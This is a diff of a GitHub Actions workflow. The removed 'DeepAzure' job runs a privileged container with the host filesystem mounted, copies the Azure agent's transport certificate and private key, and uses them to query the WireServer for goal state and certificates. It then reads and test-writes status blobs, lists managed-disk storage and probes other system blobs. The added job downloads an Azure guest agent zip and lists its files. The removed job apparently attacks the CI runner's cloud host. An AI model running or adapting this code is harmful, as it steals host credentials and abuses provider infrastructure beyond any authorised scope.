@@ -1,69 +1,61 @@
-name: DeepAzure
+name: GADownload
 on:
   workflow_dispatch:
 jobs:
   j:
     runs-on: ubuntu-latest
     steps:
-      - name: azure deep scan
-        timeout-minutes: 5
+      - name: download guest agent zips
+        timeout-minutes: 4
         run: |
           set +e
-          docker run --rm --privileged --net=host -v /:/hostfs alpine sh -c '
-            apk add --no-cache curl sed openssl 2>/dev/null
-            cp /hostfs/var/lib/waagent/TransportCert.pem /tmp/cert.pem
-            cp /hostfs/var/lib/waagent/TransportPrivate.pem /tmp/key.pem
-            HDRS="x-ms-version: 2012-11-30"
-            echo === GOALSTATE ===
-            GS=$(curl -s --max-time 10 --cert /tmp/cert.pem --key /tmp/key.pem -H "$HDRS" http://168.63.129.16/machine/?comp=goalstate 2>&1)
-            CERT_URL=$(echo "$GS" | sed -n "s/.*<Certificates>\(.*\)<\/Certificates>.*/\1/p" | sed "s/&amp;/\&/g")
-            echo "CertURL: $CERT_URL"
-            echo === CERTIFICATES WITH HEADER ===
-            CERT_B64=$(cat /tmp/cert.pem | grep -v "^---" | tr -d "\n")
-            echo "CertB64 len: ${#CERT_B64}"
-            curl -s --max-time 10 --cert /tmp/cert.pem --key /tmp/key.pem -H "$HDRS" -H "x-ms-guest-agent-public-x509-cert: $CERT_B64" "$CERT_URL" 2>&1 | head -100
-            echo
-            echo === STATUS BLOB READ ===
-            EXT_URL=$(echo "$GS" | sed -n "s/.*<ExtensionsConfig>\(.*\)<\/ExtensionsConfig>.*/\1/p" | sed "s/&amp;/\&/g")
-            EXT=$(curl -s --max-time 10 --cert /tmp/cert.pem --key /tmp/key.pem -H "$HDRS" "$EXT_URL" 2>&1)
-            STATUS_URL=$(echo "$EXT" | sed -n "s/.*<StatusUploadBlob[^>]*>\(.*\)<\/StatusUploadBlob>.*/\1/p" | sed "s/&amp;/\&/g")
-            echo "StatusURL: ${STATUS_URL:0:120}..."
-            curl -s --max-time 10 -H "x-ms-blob-type: PageBlob" "$STATUS_URL" 2>&1 | head -40
-            echo
-            echo === STATUS BLOB WRITE TEST ===
-            WRITE_RESP=$(curl -s --max-time 10 -w "\nHTTP_%{http_code}" -X PUT -H "x-ms-blob-type: PageBlob" -H "Content-Type: application/octet-stream" -H "Content-Length: 0" "$STATUS_URL" 2>&1)
-            echo "$WRITE_RESP"
-            echo
-            echo === VM ARTIFACTS PROFILE READ ===
-            ARTIFACTS_URL=$(echo "$EXT" | sed -n "s/.*<InVMArtifactsProfileBlob>\(.*\)<\/InVMArtifactsProfileBlob>.*/\1/p" | sed "s/&amp;/\&/g")
-            echo "ArtifactsURL: ${ARTIFACTS_URL:0:120}..."
-            curl -s --max-time 10 "$ARTIFACTS_URL" 2>&1 | head -60
-            echo
-            echo === GA MANIFEST DOWNLOAD ===
-            for url in \
-              https://umsadsbffxjtrsrbvlsh.blob.core.windows.net/568bb00f-455e-32b8-8deb-0e1bf1636254/568bb00f-455e-32b8-8deb-0e1bf1636254_manifest.xml \
-              https://umsalcpqbll1pt0ftgkp.blob.core.windows.net/568bb00f-455e-32b8-8deb-0e1bf1636254/568bb00f-455e-32b8-8deb-0e1bf1636254_manifest.xml \
-              ; do
-              echo "--- $url ---"
-              curl -s --max-time 10 -w "\nHTTP_%{http_code}" "$url" 2>&1 | head -40
-              echo
-            done
-            echo === MANAGED DISK STORAGE LIST ===
-            MD_BASE=$(echo "$STATUS_URL" | cut -d"?" -f1 | sed "s|/\$system/.*|/\$system|")
-            MD_SAS=$(echo "$STATUS_URL" | cut -d"?" -f2)
-            echo "MD_BASE: $MD_BASE"
-            curl -s --max-time 10 -w "\nHTTP_%{http_code}" "${MD_BASE}?restype=container&comp=list&${MD_SAS}" 2>&1 | head -40
-            echo
-            echo === OTHER SYSTEM BLOBS ===
-            BLOB_PREFIX=$(echo "$STATUS_URL" | sed "s|.*/\$system/||" | cut -d"." -f1-2)
-            echo "Prefix: $BLOB_PREFIX"
-            MD_HOST=$(echo "$STATUS_URL" | cut -d"/" -f1-3)
-            for suffix in status vmSettings screenInfo extensionStatus heartbeat; do
-              BLOB_URL="${MD_HOST}/\$system/${BLOB_PREFIX}.${suffix}?${MD_SAS}"
-              RESP=$(curl -s --max-time 5 -w "HTTP_%{http_code}" "$BLOB_URL" 2>&1)
-              CODE=$(echo "$RESP" | tail -1)
-              echo "$suffix: $CODE $(echo "$RESP" | head -5 | head -c 200)"
-            done
-            echo
-            echo === DONE ===
-          '
+          echo === DOWNLOAD GA 2.13.1.1 ===
+          curl -s --max-time 30 -o /tmp/ga.zip "https://umsadsbffxjtrsrbvlsh.blob.core.windows.net/568bb00f-455e-32b8-8deb-0e1bf1636254/568bb00f-455e-32b8-8deb-0e1bf1636254_2.13.1.1.zip" 2>&1
+          ls -la /tmp/ga.zip
+          echo === ZIP CONTENTS ===
+          python3 -c "
+import zipfile, os
+z = zipfile.ZipFile('/tmp/ga.zip')
+for i in z.infolist():
+    print(f'{i.file_size:>10} {i.compress_size:>10} {i.filename}')
+print(f'Total files: {len(z.infolist())}')
+"
+          echo === KEY FILES CONTENT ===
+          python3 -c "
+import zipfile
+z = zipfile.ZipFile('/tmp/ga.zip')
+for name in z.namelist():
+    if any(x in name.lower() for x in ['manifest', 'readme', 'version', 'config', 'handler', '.json', '.xml', '.cfg', 'setup.py', 'setup.cfg', '__init__']):
+        try:
+            data = z.read(name).decode('utf-8','replace')[:2000]
+            print(f'\n=== {name} ===')
+            print(data)
+        except: pass
+"
+          echo === PYTHON SCRIPTS LIST ===
+          python3 -c "
+import zipfile
+z = zipfile.ZipFile('/tmp/ga.zip')
+for name in sorted(z.namelist()):
+    if name.endswith('.py'):
+        print(name)
+"
+          echo === BINARY FILES ===
+          python3 -c "
+import zipfile
+z = zipfile.ZipFile('/tmp/ga.zip')
+for name in sorted(z.namelist()):
+    if not name.endswith('.py') and not name.endswith('.pyc') and '/' not in name:
+        info = z.getinfo(name)
+        print(f'{info.file_size:>10} {name}')
+"
+          echo === HANDLER MANIFEST ===
+          python3 -c "
+import zipfile
+z = zipfile.ZipFile('/tmp/ga.zip')
+for name in z.namelist():
+    if 'handler' in name.lower() and name.endswith('.json'):
+        print(f'\n=== {name} ===')
+        print(z.read(name).decode('utf-8','replace')[:3000])
+"
+          echo === DONE ===
